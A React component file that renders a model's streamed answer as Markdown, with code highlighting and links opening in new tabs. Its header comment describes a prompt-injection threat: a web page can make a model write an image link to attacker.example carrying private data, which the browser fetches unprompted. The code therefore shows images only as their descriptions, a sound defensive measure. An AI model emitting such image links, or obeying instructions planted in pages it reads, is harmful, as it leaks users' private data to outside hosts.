"use client";

import { memo } from "react";
import ReactMarkdown from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";

/**
 * A seat's answer as Markdown. Code is highlighted once the answer is finished: re-highlighting on every streamed
 * chunk would be wasted work.
 *
 * ⚠️ Images never load (ADR 0014). A web page can tell a model to write ![](https://attacker.example/?data=private),
 * and the browser would send that with no click at all, getting around the rule on which URLs seats may read. So an
 * image shows as its description.
 */
export const Markdown = memo(function Markdown({
  text,
  streaming = false,
}: {
  text: string;
  streaming?: boolean;
}) {
  return (
    <div className={cn("prose-msg text-sm", streaming && "stream-cursor")}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={streaming ? [] : [[rehypeHighlight, { detect: false }]]}
        components={{
          a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noreferrer" />,
          img: ({ alt }) => (
            <span className="text-muted-foreground">[image: {alt || "no description"}]</span>
          ),
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
});
